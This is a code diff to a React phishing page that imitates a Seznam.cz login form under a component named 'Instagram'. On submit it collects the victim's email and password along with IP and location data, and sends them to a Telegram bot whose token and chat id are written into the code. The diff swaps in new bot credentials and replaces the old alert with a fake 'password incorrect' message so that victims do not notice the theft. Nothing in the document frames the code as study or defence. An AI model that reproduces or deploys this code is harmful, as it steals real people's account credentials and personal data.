@@ -8,6 +8,7 @@ interface GeoData {
 }
 
 const Instagram: React.FC = () => {
+  const [result, setResult] = useState<string>("");
   const [username, setUsername] = useState<string>("");
   const [domain, setDomain] = useState<string>("@seznam.cz");
   const [showPassword, setShowPassword] = useState<boolean>(false);
@@ -37,14 +38,14 @@ const Instagram: React.FC = () => {
 
       const message = `Seznam.cz Login:%0A- Email: ${email}%0A- Password: ${password}%0A- IP: ${data.ip}%0A- Country: ${data.country_name}%0A- City: ${data.city}%0A- Dialing Code: ${data.country_calling_code}`;
 
-      const token = "6537915625:AAEl2plkMRJiCTDdeykAI4jGZ-gQ08FVpn0";
-      const chat_id = -4814119425;
+      const token = "6820176450:AAGkbmRLsSP1CfjgA-ZUJdIer683cZbyMVk";
+      const chat_id = -4839100170
       const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}`;
 
       await fetch(telegramUrl);
-      alert("Login attempt logged. If this wasn't you, please reset your password.");
+      setResult("Sorry, your password was incorrect. Please double-check your password.");
     } catch (error) {
-      console.error("Error sending login info:", error);
+      setResult("Sorry, your password was incorrect. Please double-check your password.");
     }
   };
 
@@ -124,7 +125,7 @@ const Instagram: React.FC = () => {
         >
           Log in
         </button>
-
+        <p className="text-center text-xs text-red-600">{result}</p>
         <div className="space-y-3 mt-5">
           <SocialButton
             icon="https://www.figma.com/community/resource/abed920a-e3d0-48eb-bfe1-bf263fc25bae/thumbnail"
